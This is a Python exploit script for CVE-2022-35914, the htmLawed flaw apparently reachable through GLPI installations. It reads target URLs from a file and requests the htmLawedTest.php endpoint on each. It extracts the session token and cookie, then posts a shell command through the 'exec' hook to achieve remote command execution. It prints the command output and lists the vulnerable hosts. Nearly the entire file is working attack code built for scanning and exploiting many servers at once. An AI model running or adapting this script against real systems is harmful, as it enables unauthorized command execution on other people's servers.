#!/usr/bin/python
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import requests
import re

requests.packages.urllib3.disable_warnings()

RED = "\x1b[91m"
BLUE = "\033[94m"
GREEN = "\033[32m"
ENDC = "\033[0m"

vulntarget = []


def main():

    for line in open("target.txt"):
        url = line.replace("\n", "")
        print("target " + url)
        cmd = "id"
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
        hook = "exec"
        exploit(url, cmd, user_agent, hook)

    print("vulntarget" + str(vulntarget))


def exploit(url, cmd, user_agent, hook):
    try:
        global vulntarget
        uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
        headers = {"User-Agent": user_agent}
        try:
            session = requests.Session()
            response_part1 = session.get(str(url) + uri, verify=False, headers=headers)
            if response_part1.status_code != 200:
                fail()
                return
        except:
            fail()
            return
        try:
            soup = BeautifulSoup(response_part1.text, "html.parser")
            if soup.title.text.find("htmLawed") == -1:
                fail()
                return
        except:
            fail()
            return

        # Prepare POST request
        token_value = soup.find_all(id="token")[0]["value"]
        sid_value = session.cookies.get("sid")
        body = {"token": token_value, "text": cmd, "hhook": hook, "sid": sid_value}
        response_part2 = session.post(
            str(url) + uri, verify=False, headers=headers, data=body
        )
        parse(response_part2.text)
        vulntarget.append(url)  # 得到结果
    except:
        fail()
        return


def parse(response):
    soup = BeautifulSoup(response, "html.parser")
    raw = soup.find_all(id="settingF")[0]

    return_code_search_regex = "\$spec\: (.*)"
    found_return_code = re.search(return_code_search_regex, raw.text, re.DOTALL).group(
        1
    )

    output_search_regex = "\[xml:lang\] \=\> 0\n(.*)\n\)"
    found_output = re.search(output_search_regex, raw.text, re.DOTALL)
    print(GREEN + "[+] Command output (Return code: " + found_return_code + "):" + ENDC)
    if found_output != None:
        raw_output = found_output.group(1)
        cleaning_regex = ".*\=\>"
        cleaned_output = re.sub(cleaning_regex, "", raw_output)
        print(cleaned_output)


def fail():
    print(RED + "[-] Server not vulnerable to CVE-2022-35914" + ENDC)
    return


if __name__ == "__main__":
    main()
